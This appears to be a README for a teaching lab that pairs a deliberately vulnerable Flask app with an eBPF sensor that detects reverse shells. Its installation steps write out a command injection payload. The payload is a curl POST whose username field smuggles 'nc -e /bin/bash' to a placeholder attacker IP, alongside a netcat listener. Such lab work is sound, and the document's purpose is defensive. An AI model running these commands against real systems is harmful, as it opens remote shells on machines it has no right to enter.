# RCE-Demo with eBPF Detection

A comprehensive security demonstration environment featuring a vulnerable web application with Remote Code Execution (RCE) and an eBPF-based sensor that detects malicious system calls in real-time using Indicators of Behavior (IoB).

##  Overview

This project provides a complete sandbox environment for:
- Understanding RCE vulnerabilities in web applications
- Learning eBPF (Extended Berkeley Packet Filter) for runtime security
- Implementing behavior-based detection (IoB) for malicious activities
- Observing how system calls can be monitored at the kernel level

The demo consists of two main components:
1. **Vulnerable Web Server** - A Python Flask application with intentional command injection vulnerability
2. **eBPF Sensor** - A kernel-level program that hooks `execve` and `connect` system calls to detect suspicious behavior

**Attacker** - on your wish
   
## Installation

```bash
# Clone the repository
git clone https://github.com/Astixxx/RCE-demo.git
cd RCE-demo

# Run the eBPF-sensor on server host machine
sudo ./sensor.bt

# Build the vulnerable container
docker build -t rce-vuln-app .

# Run the container (Run only isolation scope!!!)
docker run -d --rm\
  --name rce-auth-server \
  -p 5000:5000 \  # Web port for our web-server
  rce-vuln-app

# Create nc-server on attack machine
nc -lvnp 4000

# Attack vunlnable server (input don't shielded)
curl -X POST http://<rce_server_ip>:5000/ -d /
"username=; nc -e /bin/bash <attacker_ip> 4000;&password=test"

# Watch the output of eBPF-sensor
[ALERT] REVERSE_SHELL_DETECTED
  pid=8321     comm=nc
  ATT&CK: T1071.001 (Web Protocol)
